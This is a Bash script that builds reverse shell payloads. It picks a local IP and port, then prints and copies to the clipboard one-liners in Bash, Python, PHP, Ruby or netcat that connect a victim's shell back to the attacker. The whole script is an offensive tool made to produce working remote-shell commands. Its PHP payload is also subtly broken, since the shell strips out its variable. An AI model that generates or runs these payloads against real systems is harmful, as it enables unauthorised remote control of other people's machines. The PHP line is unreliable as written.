#!/bin/bash

#A script to auto-generate multiple reverse shells!

echo "Enter the number of wanted shell type:"
echo ""

func () {

 ips=$(ifconfig | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b")
 i=1
 for j in $ips; do
  echo "$i ) $j"
  file[i]=$j
  i=$((i + 1))
 done
}
while true; do
 func
 echo -n "$ "; read ipinput
 if [[ $ipinput -le $i-1 ]] && [[ $((ipinput)) = $ipinput ]] && [[ $ipinput -gt 0 ]]; then
  break
 else
 clear
 echo "Enter a valid number"
 fi
done

clear
echo "You selected ${file[$ipinput]}"


echo "Enter port number: "

func2 () {
 echo -n "$ "; read pnumber
}
while true; do
 func2
 if [[ $((pnumber)) != $pnumber ]]; then
 clear
 echo "Enter a valid port number."
 else
 break
 fi
done

clear
echo "You have selected IP: ${file[$ipinput]} Port:"$pnumber
echo ""
echo "Please select the wanted rshell type:"
pwd=$(pwd)

select sc in "Bash" "Python" "PHP" "Ruby" "Netcat"; do
 case $sc in
  Bash ) echo "bash -i >& /dev/tcp/${file[$ipinput]}/${pnumber} 0>&1" > Bash.txt; cat $pwd/Bash.txt | xclip -selection clipboard; break;;
  Python ) echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${file[$ipinput]}\",${pnumber}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" > Python.txt; cat $pwd/Python.txt | xclip -selection clipboard; break;;
  PHP ) echo "php -r '$sock=fsockopen(\"${file[$ipinput]}\",${pnumber});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > PHP.txt; cat $pwd/PHP.txt | xclip -selection clipboard; break;;
  Ruby ) echo "ruby -rsocket -e'f=TCPSocket.open(\"${file[$ipinput]}\",${pnumber}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" > $pwd/Ruby.txt; cat Ruby.txt | xclip -selection clipboard; break;;
  Netcat ) echo "nc -e /bin/sh ${file[$ipinput]} ${pnumber}" > Netcat.txt; cat $pwd/Netcat.txt | xclip -selection clipboard; break;;
 esac
done
echo ""
echo "The shell has been copied and saved in current directory!"
exit 1
